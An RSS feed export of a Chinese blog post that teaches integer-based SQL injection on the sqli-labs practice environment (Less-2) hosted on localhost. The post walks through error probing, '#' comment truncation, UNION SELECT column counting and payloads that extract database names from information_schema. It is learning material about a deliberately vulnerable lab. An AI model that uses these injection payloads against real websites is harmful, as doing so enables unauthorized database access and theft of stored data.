<?xml version="1.0"?>
<rss version="2.0">
    <channel>
        <title>My Violet Eva Garden • Posts by &#34;sql注入&#34; tag</title>
        <link>https://kiyomijin.github.io</link>
        <description></description>
        <language>zh-CN</language>
        <pubDate>Thu, 29 Sep 2022 00:27:56 +0800</pubDate>
        <lastBuildDate>Thu, 29 Sep 2022 00:27:56 +0800</lastBuildDate>
        <category>原创</category>
        <category>SQL注入</category>
        <category>数据库安全</category>
        <category>CTF小训</category>
        <category>Misc</category>
        <item>
            <guid isPermalink="true">https://kiyomijin.github.io/2022/09/29/SQL%E6%B3%A8%E5%85%A5%E6%8E%A2%E7%A9%B6/%E6%95%B4%E5%9E%8B%E6%B3%A8%E5%85%A5/</guid>
            <title>整型注入</title>
            <link>https://kiyomijin.github.io/2022/09/29/SQL%E6%B3%A8%E5%85%A5%E6%8E%A2%E7%A9%B6/%E6%95%B4%E5%9E%8B%E6%B3%A8%E5%85%A5/</link>
            <category>SQL注入</category>
            <pubDate>Thu, 29 Sep 2022 00:27:56 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;sql注入之整型注入&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#sql注入之整型注入&#34;&gt;#&lt;/a&gt; SQL 注入之整型注入&lt;/h1&gt;
&lt;p&gt;本篇使用整型注入来从 0 到 1 进入 “SQL 注入” 的大门。&lt;/p&gt;
&lt;h2 id=&#34;环境准备&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#环境准备&#34;&gt;#&lt;/a&gt; 环境准备&lt;/h2&gt;
&lt;p&gt;当然是先安装 phpStudy，然后一键傻瓜式安装后点击启动按钮&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220928202842147.png&#34; alt=&#34;image-20220928202842147&#34;&gt;&lt;/p&gt;
&lt;p&gt;之后点击 MySQL 管理器&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220928203059624.png&#34; alt=&#34;image-20220928203059624&#34;&gt;&lt;/p&gt;
&lt;p&gt;双击 localhost，账户名 root，密码 root 即可进入。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220928203206981.png&#34; alt=&#34;image-20220928203206981&#34;&gt;&lt;/p&gt;
&lt;p&gt;打开浏览器，选择 sqli&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220928203903223.png&#34; alt=&#34;image-20220928203903223&#34;&gt;&lt;/p&gt;
&lt;p&gt;选择第一个 Setup&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220928203930840.png&#34; alt=&#34;image-20220928203930840&#34;&gt;&lt;/p&gt;
&lt;p&gt;出现这个界面，即完成了数据库的初始化&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220928203950837.png&#34; alt=&#34;image-20220928203950837&#34;&gt;&lt;/p&gt;
&lt;p&gt;点击后退键回到上一个页面，然后点击 Less-1&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220928204115026.png&#34; alt=&#34;image-20220928204115026&#34;&gt;&lt;/p&gt;
&lt;p&gt;出现 SQLI DUMB SERIES-1&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220928204123886.png&#34; alt=&#34;image-20220928204123886&#34;&gt;&lt;/p&gt;
&lt;p&gt;接下来以 Less-2 作为例子进行讲解：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220928210728567.png&#34; alt=&#34;image-20220928210728567&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;sql注入步骤&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#sql注入步骤&#34;&gt;#&lt;/a&gt; SQL 注入步骤&lt;/h2&gt;
&lt;h3 id=&#34;1判断是否有注入判断是否未严格校验&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#1判断是否有注入判断是否未严格校验&#34;&gt;#&lt;/a&gt; ①判断是否有注入 (判断是否未严格校验)&lt;/h3&gt;
&lt;h4 id=&#34;1可控参数的改变能否影响页面的显示结果&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#1可控参数的改变能否影响页面的显示结果&#34;&gt;#&lt;/a&gt; 1) 可控参数的改变能否影响页面的显示结果&lt;/h4&gt;
&lt;p&gt;网页让输入 id，可是我们并没有看到交互框，因此猜测有可能是需要发送请求。&lt;/p&gt;
&lt;p&gt;点击查看网页源代码，在 Network 这里看到是 GET 请求。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220928213756712.png&#34; alt=&#34;image-20220928213756712&#34;&gt;&lt;/p&gt;
&lt;p&gt;因此我们选择在链接后面加上 id 参数&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220928213510534.png&#34; alt=&#34;image-20220928213510534&#34;&gt;&lt;/p&gt;
&lt;p&gt;发现成功令其输出内容。&lt;/p&gt;
&lt;p&gt;此时我们再次改变 GET 请求中 id 的值，发现，内容会对应有所变化。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220928214022889.png&#34; alt=&#34;image-20220928214022889&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;2输入的sql语句是否能报错&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#2输入的sql语句是否能报错&#34;&gt;#&lt;/a&gt; 2) 输入的 SQL 语句是否能报错&lt;/h4&gt;
&lt;p&gt;因为能通过数据库的报错，看到数据库的一些语句痕迹&lt;/p&gt;
&lt;p&gt;我们假设它后台的查询语句是&lt;/p&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;select&lt;/span&gt; username,password &lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;user&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;where&lt;/span&gt; id &lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt; $id&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;猜想：能否通过加单引号令其出错？&lt;/p&gt;
&lt;p&gt;因为：&lt;/p&gt;
&lt;p&gt;如果是整型注入漏洞，则像 3’这样的字符传入 $id 处会引发错误。&lt;/p&gt;
&lt;p&gt;如果是单引号注入漏洞，像 3’这样的字符传入 $id 处也会引发错误。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220928214501924.png&#34; alt=&#34;image-20220928214501924&#34;&gt;&lt;/p&gt;
&lt;p&gt;黄字部分的报错语句，非常之重要！&lt;/p&gt;
&lt;p&gt;near ‘xxxxxxxxxx’ at line 1 是在告诉我们在第 1 行的 xxxxxxx 语句处出现错误，而我们通过加入单引号使其发生错误，错误信息就会帮我们显示了出错的局部代码，也就是 “输出了单引号后面的语句”——LIMIT 0,1。&lt;/p&gt;
&lt;p&gt;为了再次确定 near ‘xxxxxxxxxx’ at line 1 中在 LIMIT 0,1 之前的一个单引号是我们输入的单引号，我们再次改变 GET 请求中 &amp;quot;’ &#39;&amp;quot;（单引号）变为 &amp;quot;&amp;quot;&amp;quot;（双引号）&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220928215359897.png&#34; alt=&#34;image-20220928215359897&#34;&gt;&lt;/p&gt;
&lt;p&gt;发现成功令报错信息中 near &#39;xxxxx’中的 LIMIT 前一个符号发生改变。&lt;/p&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;#如果是整型注入，加入单引号会报错&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;select&lt;/span&gt; username,password &lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;user&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;where&lt;/span&gt; id &lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;string&#34;&gt;&amp;#x27; limit 0,1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;#如果是单引号注入，加入单引号也会报错&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;select username,password from user where id = &amp;#x27;&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;#x27;&lt;/span&gt; limit &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;据目前输入的结果来看，此网页存在 “整型注入” 或者 “单引号注入”&lt;/p&gt;
&lt;h4 id=&#34;3输入的sql语句能否不报错&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#3输入的sql语句能否不报错&#34;&gt;#&lt;/a&gt; 3) 输入的 SQL 语句能否不报错&lt;/h4&gt;
&lt;p&gt;为了查看我们的语句能够成功闭合&lt;/p&gt;
&lt;p&gt;那怎么区分到底是整型还是单引号呢？&lt;/p&gt;
&lt;p&gt;使用 # 来注释后面语句&lt;/p&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;#加入#号后，两个语法依旧错误，故都会报错&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;select&lt;/span&gt; username,password &lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;user&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;where&lt;/span&gt; id &lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;string&#34;&gt;&amp;#x27; # limit 0,1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;select username,password from user where id = &amp;#x27;&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;string&#34;&gt;&amp;#x27; #&amp;#x27;&lt;/span&gt; limit &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;结果确实是报错。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220928220327744.png&#34; alt=&#34;image-20220928220327744&#34;&gt;&lt;/p&gt;
&lt;p&gt;接下来我们删掉单引号&lt;/p&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;#如果是整型注入，则删掉单引号，保留#号后，不会报错！&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;select&lt;/span&gt; username,password &lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;user&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;where&lt;/span&gt; id &lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;2&lt;/span&gt; # limit &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#如果是单引号注入，则删掉单引号，保留#号后，依旧会报错&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;select&lt;/span&gt; username,password &lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;user&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;where&lt;/span&gt; id &lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;#x27;2 #&amp;#x27;&lt;/span&gt; limit &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20220928220529170.png&#34; alt=&#34;image-20220928220529170&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;2什么类型的注入&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#2什么类型的注入&#34;&gt;#&lt;/a&gt; ②什么类型的注入&lt;/h3&gt;
&lt;p&gt;因此，此处经过上述报错信息确定，存在&lt;strong&gt;整型注入&lt;/strong&gt;！&lt;/p&gt;
&lt;h3 id=&#34;3语句是否能够被恶意修改&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#3语句是否能够被恶意修改&#34;&gt;#&lt;/a&gt; ③语句是否能够被恶意修改&lt;/h3&gt;
&lt;p&gt;恶意修改主要指能否再加入一些我们想要的判断条件，比如：&lt;/p&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;select&lt;/span&gt; username,password &lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;user&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;where&lt;/span&gt; id &lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;2&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;and&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;# limit &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;如果是整型注入无误，这里条件为 “id = 2 and 0”—— 这是永假条件，则不会有任何查询结果。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220928221547372.png&#34; alt=&#34;image-20220928221547372&#34;&gt;&lt;/p&gt;
&lt;p&gt;结果正如我们所料，空空如也。&lt;/p&gt;
&lt;h3 id=&#34;4是否能够成功执行&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#4是否能够成功执行&#34;&gt;#&lt;/a&gt; ④是否能够成功执行&lt;/h3&gt;
&lt;p&gt;第三个能满足，其实第四个就顺带就 OK。&lt;/p&gt;
&lt;h3 id=&#34;5获取我们想要的数据&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#5获取我们想要的数据&#34;&gt;#&lt;/a&gt; ⑤获取我们想要的数据&lt;/h3&gt;
&lt;p&gt;关键数据是保存在数据库里面的，关系如下：&lt;/p&gt;
&lt;p&gt;数据库 -&amp;gt; 表 -&amp;gt; 字段 -&amp;gt; 值&lt;/p&gt;
&lt;p&gt;打开 MySQL，我们可以看到其中有 information_schema 库（这是 MySQL 自带的库，管理所有表信息）&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220928223622076.png&#34; alt=&#34;image-20220928223622076&#34;&gt;&lt;/p&gt;
&lt;p&gt;这个库中有三个表非常值得我们关注：&lt;/p&gt;
&lt;p&gt;Schemata 表（包含所有的 &lt;code&gt;库名信息&lt;/code&gt; ）、Tables 表（包含所有的 &lt;code&gt;表名信息&lt;/code&gt; ）、Columns 表（包含所有的 &lt;code&gt;列名信息&lt;/code&gt; ）&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;首先是 Schemeta 表&lt;/strong&gt;， &lt;code&gt;schema_name&lt;/code&gt;  对应着所有数据库的名字。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220928224006640.png&#34; alt=&#34;image-20220928224006640&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;其次是 Tables 表&lt;/strong&gt;， &lt;code&gt;table_name&lt;/code&gt;  这个列里，存储了 &lt;code&gt;table_schema对应的库&lt;/code&gt; 下面的所有表&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220928224135720.png&#34; alt=&#34;image-20220928224135720&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;最后是 Columns 表&lt;/strong&gt;，通过 &lt;code&gt;table_schema&lt;/code&gt;  对应的库， &lt;code&gt;table_name&lt;/code&gt;  对应的表，&lt;strong&gt;使用 column_name 对应的列名，来唯一地定位某个列&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220928224405698.png&#34; alt=&#34;image-20220928224405698&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;1构造联合查询&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#1构造联合查询&#34;&gt;#&lt;/a&gt; 1）构造联合查询&lt;/h4&gt;
&lt;p&gt;确定的整型注入中，我们需要构造出我们想要的查询内容，比如在&lt;strong&gt; information_schema 库&lt;/strong&gt;的&lt;strong&gt; Schema 表&lt;/strong&gt;中获取 &lt;code&gt;schema_name&lt;/code&gt; ：&lt;/p&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http:&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;127.0&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;.0&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;.1&lt;/span&gt;&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;sqli&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;Less&lt;span class=&#34;number&#34;&gt;-2&lt;/span&gt;&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;?id&lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;select&lt;/span&gt; schema_name &lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; information_schema.schemata #&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20220928225341595.png&#34; alt=&#34;image-20220928225341595&#34;&gt;&lt;/p&gt;
&lt;p&gt;但如果像上面这样构造，会报错，我们需要使用到联合查询。&lt;/p&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http:&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;127.0&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;.0&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;.1&lt;/span&gt;&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;sqli&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;Less&lt;span class=&#34;number&#34;&gt;-2&lt;/span&gt;&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;?id&lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;union&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;select&lt;/span&gt; schema_name &lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; information_schema.schemata #&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20220928225106827.png&#34; alt=&#34;image-20220928225106827&#34;&gt;&lt;/p&gt;
&lt;p&gt;但是，如果像上面这样构造，依旧会报错，在 SQL 查询中，union 前后的两个列 ++&lt;strong&gt; 需要列数完全一致才可拼接&lt;/strong&gt; ++。&lt;/p&gt;
&lt;p&gt;因此，需要使用占位符来定位前面的查询是多少列：&lt;/p&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;#占位一个，后面的代码用#注释掉&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;http:&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;127.0&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;.0&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;.1&lt;/span&gt;&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;sqli&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;Less&lt;span class=&#34;number&#34;&gt;-2&lt;/span&gt;&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;?id&lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;union&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;select&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt; #&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#占位两个，后面的代码用#注释掉&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;http:&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;127.0&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;.0&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;.1&lt;/span&gt;&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;sqli&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;Less&lt;span class=&#34;number&#34;&gt;-2&lt;/span&gt;&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;?id&lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;union&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;select&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;2&lt;/span&gt; #&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#占位三个，后面的代码用#注释掉&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;http:&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;127.0&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;.0&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;.1&lt;/span&gt;&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;sqli&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;Less&lt;span class=&#34;number&#34;&gt;-2&lt;/span&gt;&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;?id&lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;union&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;select&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;3&lt;/span&gt; #&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;....&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;注意，这里的 1,2,3 可以填任何数字或者符号，仅仅为了占位使用，&lt;strong&gt;可以被任意 “想要看到的输出内容” 覆盖&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;经过多次定位，我们最终得到：&lt;strong&gt;前面的查询&lt;/strong&gt;使用到的是&lt;strong&gt; 3 个列&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220928225313035.png&#34; alt=&#34;image-20220928225313035&#34;&gt;&lt;/p&gt;
&lt;p&gt;因此有：&lt;/p&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http:&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;127.0&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;.0&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;.1&lt;/span&gt;&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;sqli&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;Less&lt;span class=&#34;number&#34;&gt;-2&lt;/span&gt;&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;?id&lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;union&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;select&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;, schema_name &lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; information_schema.schemata #&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20220928225608030.png&#34; alt=&#34;image-20220928225608030&#34;&gt;&lt;/p&gt;
&lt;p&gt;虽然正确显示，但是我们查询的内容并没有显示出来。这是因为，使用 union 查询，&lt;strong&gt;还有个 bug&lt;/strong&gt; 就是如果前面的查询有效，&lt;strong&gt;最终结果会在前面查询到的结尾后面拼接&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;为了让后面查询到的内容（我们 &lt;code&gt;想要看到的数据&lt;/code&gt; ）提前，&lt;strong&gt;我们需要令前面的查询失效&lt;/strong&gt;，简单的方法就是令 id = 39888 这样平常不会使用的奇怪数字：&lt;/p&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http:&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;127.0&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;.0&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;.1&lt;/span&gt;&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;sqli&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;Less&lt;span class=&#34;number&#34;&gt;-2&lt;/span&gt;&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;?id&lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;39888&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;union&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;select&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;, schema_name &lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; information_schema.schemata #&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20220928225926603.png&#34; alt=&#34;image-20220928225926603&#34;&gt;&lt;/p&gt;
